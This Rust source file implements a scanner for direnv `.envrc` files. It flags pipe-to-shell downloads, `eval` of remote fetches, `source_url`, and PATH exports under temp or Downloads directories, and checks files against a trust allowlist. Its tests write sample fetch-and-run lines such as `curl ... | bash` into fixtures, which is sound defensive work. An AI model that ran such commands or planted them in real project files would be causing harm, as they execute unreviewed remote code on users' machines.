//! `direnv` / `.envrc` allowlist + scanner (TASK-319).
//!
//! Walks project roots for `.envrc`. The file is bash with
//! `direnv` builtins. Each script is matched against a small
//! suspicious-pattern set and against a caller-supplied
//! allowlist of project paths the user has explicitly trusted.
//!
//! Patterns checked:
//!
//!   * `curl ... | sh` / `wget ... | bash` (mirrors
//!     [`super::pipe_guard`])
//!   * `eval $(curl ...)` / `eval $(wget ...)`
//!   * `export PATH=` prepending an absolute path under
//!     `$TMPDIR` / `/tmp` / `~/Downloads`
//!   * `source_url` direnv stdlib helper (fetches remote
//!     bash and sources it)

use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum DirenvFindingKind {
    PipeToShell,
    EvalRemoteFetch,
    SuspiciousPathExport,
    SourceUrl,
    UntrustedDirenv,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct DirenvFinding {
    pub kind: DirenvFindingKind,
    pub source: PathBuf,
    pub line_number: Option<usize>,
    pub detail: String,
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct DirenvAllowlist {
    pub trusted_paths: Vec<PathBuf>,
}

impl DirenvAllowlist {
    pub fn is_trusted(&self, envrc_path: &Path) -> bool {
        self.trusted_paths
            .iter()
            .any(|root| envrc_path.starts_with(root))
    }
}

pub fn audit(envrc_path: &Path, allowlist: &DirenvAllowlist) -> Vec<DirenvFinding> {
    let mut out = Vec::new();
    let Ok(body) = std::fs::read_to_string(envrc_path) else {
        return out;
    };
    for (idx, raw) in body.lines().enumerate() {
        let line_number = idx + 1;
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        if line.contains("source_url") {
            out.push(DirenvFinding {
                kind: DirenvFindingKind::SourceUrl,
                source: envrc_path.to_path_buf(),
                line_number: Some(line_number),
                detail: line.to_string(),
            });
        }
        if (line.contains("curl") || line.contains("wget"))
            && line.contains('|')
            && (line.contains(" sh") || line.contains("/sh") || line.contains("bash"))
        {
            out.push(DirenvFinding {
                kind: DirenvFindingKind::PipeToShell,
                source: envrc_path.to_path_buf(),
                line_number: Some(line_number),
                detail: line.to_string(),
            });
        }
        if line.contains("eval $(") && (line.contains("curl ") || line.contains("wget ")) {
            out.push(DirenvFinding {
                kind: DirenvFindingKind::EvalRemoteFetch,
                source: envrc_path.to_path_buf(),
                line_number: Some(line_number),
                detail: line.to_string(),
            });
        }
        if let Some(rest) = line.strip_prefix("export PATH=") {
            if path_export_is_suspicious(rest) {
                out.push(DirenvFinding {
                    kind: DirenvFindingKind::SuspiciousPathExport,
                    source: envrc_path.to_path_buf(),
                    line_number: Some(line_number),
                    detail: line.to_string(),
                });
            }
        }
    }
    if !out.is_empty() && !allowlist.is_trusted(envrc_path) {
        out.push(DirenvFinding {
            kind: DirenvFindingKind::UntrustedDirenv,
            source: envrc_path.to_path_buf(),
            line_number: None,
            detail: "envrc is not in the user-trusted allowlist".to_string(),
        });
    }
    out
}

fn path_export_is_suspicious(rhs: &str) -> bool {
    let lower = rhs.to_ascii_lowercase();
    lower.contains("/tmp")
        || lower.contains("/var/tmp")
        || lower.contains("/downloads")
        || lower.contains("/var/folders/")
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    #[test]
    fn flags_pipe_to_shell_envrc() {
        let dir = tempdir().unwrap();
        let p = dir.path().join(".envrc");
        std::fs::write(&p, "curl -fsSL https://x.com/i | bash\n").unwrap();
        let out = audit(&p, &DirenvAllowlist::default());
        assert!(out.iter().any(|f| f.kind == DirenvFindingKind::PipeToShell));
        assert!(
            out.iter()
                .any(|f| f.kind == DirenvFindingKind::UntrustedDirenv)
        );
    }

    #[test]
    fn trusted_envrc_drops_untrusted_finding() {
        let dir = tempdir().unwrap();
        let p = dir.path().join(".envrc");
        std::fs::write(&p, "curl x | sh\n").unwrap();
        let allow = DirenvAllowlist {
            trusted_paths: vec![dir.path().to_path_buf()],
        };
        let out = audit(&p, &allow);
        // Other findings still surface; just no `UntrustedDirenv`.
        assert!(
            !out.iter()
                .any(|f| f.kind == DirenvFindingKind::UntrustedDirenv)
        );
        assert!(out.iter().any(|f| f.kind == DirenvFindingKind::PipeToShell));
    }

    #[test]
    fn flags_source_url() {
        let dir = tempdir().unwrap();
        let p = dir.path().join(".envrc");
        std::fs::write(&p, "source_url https://example.com/sec.sh\n").unwrap();
        let out = audit(&p, &DirenvAllowlist::default());
        assert!(out.iter().any(|f| f.kind == DirenvFindingKind::SourceUrl));
    }

    #[test]
    fn flags_tmp_path_export() {
        let dir = tempdir().unwrap();
        let p = dir.path().join(".envrc");
        std::fs::write(&p, "export PATH=/tmp/bin:$PATH\n").unwrap();
        let out = audit(&p, &DirenvAllowlist::default());
        assert!(
            out.iter()
                .any(|f| f.kind == DirenvFindingKind::SuspiciousPathExport)
        );
    }
}
